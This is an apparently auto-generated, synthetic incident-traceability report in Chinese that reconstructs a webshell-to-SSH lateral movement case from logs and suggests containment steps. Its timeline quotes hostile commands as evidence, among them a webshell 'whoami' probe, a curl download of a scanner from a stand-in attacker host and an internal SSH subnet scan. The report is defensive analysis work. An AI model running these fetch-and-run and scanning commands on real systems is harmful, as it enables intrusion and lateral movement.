# 数据取数统计

离线合成案例；本次未连接 ES/SLS、使用凭证或发送通知。

查询计数来自结果元数据；输入预录的查询成功／超时也会计入，不能视为本次真实联网。

| 记录数 | 累计取数 | 请求 | 查询 | 失败查询 | 查询完整性 |
|---|---|---|---|---|---|
| 22 | 0 | 0 | 0 | 0 | unknown |

| 数据类型 | 记录数 |
|---|---|
| waf\_alert | 2 |
| web\_access\_log | 3 |
| host\_exec | 4 |
| host\_connect | 2 |
| host\_file\_op | 2 |
| ssh\_auth | 3 |
| firewall\_log | 2 |
| dns\_log | 1 |
| asset\_inventory | 3 |

| 去重 | 窗口过滤 | 截断类型 |
|---|---|---|
| 0 | 0 | \[\] |

逐资产取数明细为空；离线输入不等于生产环境完整覆盖。

| 开始时间 | 结束时间 | 告警锚点 |
|---|---|---|
| 2026-06-22T08:00:00+08:00 | 2026-06-22T12:00:00+08:00 | 2026-06-22T09:08:05+08:00 |

## 还原 WebShell 到 SSH 横向移动

**结构化结果报告（自动生成，尚待智能体证据复核）。** 本文不声称已完成 AI 叙事分析。

案例：webshell-to-ssh-lateral；Skill：traceability-analysis。

### 结论

观察到主机执行及横向证据，入口因果关系仍需复核（confirmed\_intrusion\_chain）

| 原始置信度 | 顶层上限 | 证据约束建议上限 | 证据范围 |
|---|---|---|---|
| 0.88 | 0.88 | 0.85 | supplied\_evidence\_only |

规则判定不等于每个攻击阶段都已证实；空结果或未达阈值不能证明安全。应同时考虑证据约束上限。

### 入口与横向证据

| 观察目标 | 入口角色 | 首次攻破点状态 | URL | 主要证据 |
|---|---|---|---|---|
| 10.0.1.5 | observed\_control\_point | unresolved | http://10.0.1.5/api/upload.php | \["web-001"\] |

观察到的控制点不等于原始攻破方式；规范化 URL、关联边和 ATT&CK 标签需结合原始证据复核。

| 横向分类 | 来源 | 目标 | 账号 | 确认时间 | 证据 |
|---|---|---|---|---|---|
| confirmed | 10.0.1.5 | 10.0.2.10 | root | 2026-06-22T09:19:15+08:00 | \["exec-001", "ssh-002", "exec-002", "exec-003", "exec-004"\] |
| confirmed | 10.0.1.5 | 10.0.2.20 | deploy | 2026-06-22T09:22:40+08:00 | \["exec-001", "ssh-003", "exec-002", "exec-003", "exec-004"\] |

| 影响目标（脚本标签） | 角色 | 排查优先级 |
|---|---|---|
| 10.0.1.5 | initial\_compromise | P0 |
| 10.0.2.10 | lateral\_target | P0 |
| 10.0.2.20 | lateral\_target | P0 |

| 建议动作 |
|---|
| 立即隔离初始受害主机: 10.0.1.5 |
| 排查并隔离横向目标（至少）: 10.0.2.10, 10.0.2.20 |
| 保全 WEB 与 SSH 相关日志，冻结当前时间窗证据 |
| 重置横向涉及主机上的可疑账号密码，检查 SSH 密钥 |

ATT&CK（规则映射）：\["T1190", "T1059", "T1021.004", "T1059.004", "T1082", "T1046", "T1078", "T1505.003", "T1110.001"\]。

### 原始证据时间线

| 时间 | 来源 | 证据 ID | 主机／目标 | 记录 |
|---|---|---|---|---|
| 未提供 | asset\_inventory | asset-001 | 未提供 | {"evidence\_id": "asset-001", "hostname": "web-01", "ip": "10.0.1.5", "zone": "dmz", "owner": "web-team", "services": \["nginx", "php-fpm"\]} |
| 未提供 | asset\_inventory | asset-002 | 未提供 | {"evidence\_id": "asset-002", "hostname": "db-01", "ip": "10.0.2.10", "zone": "internal", "owner": "dba-team", "services": \["mysql"\]} |
| 未提供 | asset\_inventory | asset-003 | 未提供 | {"evidence\_id": "asset-003", "hostname": "app-02", "ip": "10.0.2.20", "zone": "internal", "owner": "app-team", "services": \["java", "tomcat"\]} |
| 2026-06-22T09:07:55+08:00 | web\_access\_log | web-001 | web-01 | 来源：203.0.113.55；方法：POST；路径：/api/upload.php；响应状态：200 |
| 2026-06-22T09:07:58+08:00 | waf\_alert | waf-002 | web-01 | 来源：203.0.113.55；方法：POST；路径：/api/upload.php；载荷：------WebKitFormBoundary；动作：logged |
| 2026-06-22T09:08:02+08:00 | web\_access\_log | web-002 | web-01 | 来源：203.0.113.55；方法：GET；路径：/api/upload.php?cmd=whoami；响应状态：200 |
| 2026-06-22T09:08:05+08:00 | waf\_alert | waf-001 | web-01 | 来源：203.0.113.55；方法：POST；路径：/api/upload.php?cmd=whoami；载荷：cmd=whoami&amp;pass=xxx；动作：block |
| 2026-06-22T09:10:08+08:00 | web\_access\_log | web-003 | web-01 | 来源：203.0.113.55；方法：POST；路径：/upload/shell.php；响应状态：200 |
| 2026-06-22T09:10:15+08:00 | host\_exec | exec-001 | web-01 | 命令：sh -c whoami |
| 2026-06-22T09:10:45+08:00 | host\_file\_op | file-001 | web-01 | 动作：create；文件：/var/www/html/upload/shell.php |
| 2026-06-22T09:12:28+08:00 | dns\_log | dns-001 | 10.0.1.5 | 查询：tools.evil-cdn.example；应答：198.51.100.5 |
| 2026-06-22T09:12:30+08:00 | host\_connect | connect-001 | web-01 | 目的：198.51.100.5；目的端口：80 |
| 2026-06-22T09:12:32+08:00 | host\_exec | exec-002 | web-01 | 命令：curl -o /tmp/sshscan http://198.51.100.5/tools/sshscan |
| 2026-06-22T09:12:35+08:00 | host\_file\_op | file-002 | web-01 | 动作：create；文件：/tmp/sshscan |
| 2026-06-22T09:13:05+08:00 | host\_exec | exec-003 | web-01 | 命令：chmod +x /tmp/sshscan |
| 2026-06-22T09:14:20+08:00 | host\_exec | exec-004 | web-01 | 命令：/tmp/sshscan -t 10.0.2.0/24 -p 22 |
| 2026-06-22T09:18:50+08:00 | ssh\_auth | ssh-001 | db-01 | 来源：10.0.1.5；用户：root；结果：Failed；认证方式：password |
| 2026-06-22T09:19:08+08:00 | host\_connect | connect-002 | web-01 | 目的：10.0.2.10；目的端口：22 |
| 2026-06-22T09:19:10+08:00 | firewall\_log | fw-001 | 未提供 | 来源：10.0.1.5；目的：10.0.2.10；目的端口：22；动作：allow |
| 2026-06-22T09:19:15+08:00 | ssh\_auth | ssh-002 | db-01 | 来源：10.0.1.5；用户：root；结果：Accepted；认证方式：publickey |
| 2026-06-22T09:22:35+08:00 | firewall\_log | fw-002 | 未提供 | 来源：10.0.1.5；目的：10.0.2.20；目的端口：22；动作：allow |
| 2026-06-22T09:22:40+08:00 | ssh\_auth | ssh-003 | app-02 | 来源：10.0.1.5；用户：deploy；结果：Accepted；认证方式：publickey |

### 数据缺口与结论边界

- no\_match:web\_access\_to\_host\_exec (WEB 请求落到主机命令执行（攻击是否成功）)
- no\_match:attacker\_ip\_to\_ssh\_auth (外网攻击 IP 是否尝试/成功 SSH 登录)
- no\_match:victim\_host\_to\_waf\_by\_target\_ip (已知受害 host\_ip（params.target\_ip），反查 WAF 告警（upstream\_addr→target\_ip）并还原攻击源 src\_ip)
- no\_match:victim\_host\_to\_web\_access\_by\_target\_ip (已知受害 host\_ip，反查网关 access（upstream\_addr→target\_ip）并关联 web\_access\_to\_host\_exec)
- no\_match:ssh\_auth\_to\_host\_exec\_same\_host (SSH 登录成功后主机上的命令执行)
- no\_match:host\_to\_cmdb (主机行为映射到资产清单（区域、负责人、服务）)
- 横向结论基于部分 SSH 覆盖，需标注「至少」

上述动作均为建议，本次未执行隔离、封禁或凭证修改。

### 可复核来源

[离线输入](</Users/op/Desktop/%E9%A1%B9%E7%9B%AE/secweaver-community-0.3.21/examples/traceability/s1-web-shell-to-ssh-lateral.json>) · [本次 JSON](</Users/op/Desktop/%E9%A1%B9%E7%9B%AE/secweaver-community-0.3.21/outputs/ai-showcase/webshell-to-ssh-lateral.json>)
